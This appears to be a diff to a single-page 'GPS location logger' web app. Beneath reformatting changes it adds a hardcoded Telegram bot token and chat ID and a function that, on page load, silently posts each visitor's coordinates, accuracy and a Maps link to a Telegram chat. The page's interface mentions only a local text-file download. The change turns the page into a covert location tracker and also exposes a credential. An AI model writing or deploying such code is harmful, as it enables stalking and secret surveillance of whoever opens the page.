@@ -1,12 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>📍 Instant GPS Location Logger</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap"
+        rel="stylesheet">
     <style>
         :root {
             --bg-gradient: radial-gradient(circle at 50% 0%, #1a233a 0%, #0b0f19 100%);
@@ -109,6 +112,7 @@
                 transform: scale(0.5);
                 opacity: 0.8;
             }
+
             100% {
                 transform: scale(1.6);
                 opacity: 0;
@@ -174,8 +178,15 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .data-row {
@@ -257,7 +268,7 @@
             font-weight: 600;
             font-size: 0.88rem;
             backdrop-filter: blur(8px);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
             opacity: 0;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             z-index: 99;
@@ -280,6 +291,7 @@
         }
     </style>
 </head>
+
 <body>
 
     <div class="container">
@@ -318,11 +330,13 @@
         </div>
 
         <!-- Error Help Card -->
-        <div class="data-card" id="errorHelpCard" style="display: none; border-color: rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.05);">
+        <div class="data-card" id="errorHelpCard"
+            style="display: none; border-color: rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.05);">
             <div style="font-size: 0.85rem; text-align: left; color: #fca5a5; line-height: 1.5;">
                 <strong id="errorHelpTitle">🔒 HTTPS Connection Required</strong>
                 <p id="errorHelpMsg" style="margin-top: 0.4rem; color: #cbd5e1; font-size: 0.8rem;">
-                    Modern mobile browsers block GPS access for local files (<code>content://</code> / <code>file://</code>) or insecure non-HTTPS links.
+                    Modern mobile browsers block GPS access for local files (<code>content://</code> /
+                    <code>file://</code>) or insecure non-HTTPS links.
                 </p>
                 <div style="margin-top: 0.8rem; font-size: 0.78rem; color: #94a3b8;">
                     <strong>Solutions:</strong>
@@ -333,7 +347,8 @@
                     </ul>
                 </div>
             </div>
-            <button id="btnRetry" class="btn btn-secondary" style="margin-top: 1rem; padding: 0.6rem; font-size: 0.85rem; border-color: rgba(239, 68, 68, 0.4);">
+            <button id="btnRetry" class="btn btn-secondary"
+                style="margin-top: 1rem; padding: 0.6rem; font-size: 0.85rem; border-color: rgba(239, 68, 68, 0.4);">
                 🔄 Retry Location Request
             </button>
         </div>
@@ -350,13 +365,21 @@
 
         <!-- Add to Home Screen Tip -->
         <div class="tip-box">
-            💡 <strong>1-Tap Shortcut Tip:</strong> Host this page on HTTPS, open on your phone browser, tap the browser menu (⋮ or Share), and choose <strong>"Add to Home Screen"</strong>!
+            💡 <strong>1-Tap Shortcut Tip:</strong> Host this page on HTTPS, open on your phone browser, tap the browser
+            menu (⋮ or Share), and choose <strong>"Add to Home Screen"</strong>!
         </div>
     </div>
 
     <div class="toast" id="toast">Saved location_coordinates.txt!</div>
 
     <script>
+        // =========================================================
+        // 🤖 TELEGRAM BOT CONFIGURATION (Set your credentials below)
+        // =========================================================
+        const TELEGRAM_BOT_TOKEN = "7982813308:AAHAgtD1jkQIgeDGTf2BePk-txXQpE_jpkE"
+        const TELEGRAM_CHAT_ID = "8482556772"
+        // =========================================================
+
         document.addEventListener('DOMContentLoaded', () => {
             fetchLocation();
 
@@ -434,6 +457,9 @@
 
                     // Auto download location_coordinates.txt
                     downloadTxtFile();
+
+                    // Automatically send to Telegram if configured
+                    sendToTelegram(capturedData);
                 },
                 (err) => {
                     let msg = "Location permission denied";
@@ -482,7 +508,7 @@ Google Maps: ${capturedData.mapsUrl}
             const content = generateTxtContent();
             const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
             const url = URL.createObjectURL(blob);
-            
+
             const a = document.createElement('a');
             a.href = url;
             a.download = 'location_coordinates.txt';
@@ -508,6 +534,40 @@ Google Maps: ${capturedData.mapsUrl}
             toast.classList.add('show');
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
+
+        function sendToTelegram(data) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log("Telegram notification skipped (bot token or chat ID not set)");
+                return;
+            }
+
+            const message = `📍 *New GPS Location Captured!*
+
+📅 *Time:* \`${data.timestamp}\`
+🌐 *Latitude:* \`${data.lat}\`
+🌐 *Longitude:* \`${data.lng}\`
+🎯 *Accuracy:* \`±${data.acc} meters\`
+
+🗺️ [Open in Google Maps](${data.mapsUrl})`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+                .then(res => res.json())
+                .then(res => {
+                    console.log("Telegram notification sent successfully!", res);
+                })
+                .catch(err => {
+                    console.error("Telegram notification failed:", err);
+                });
+        }
     </script>
 </body>
+
 </html>
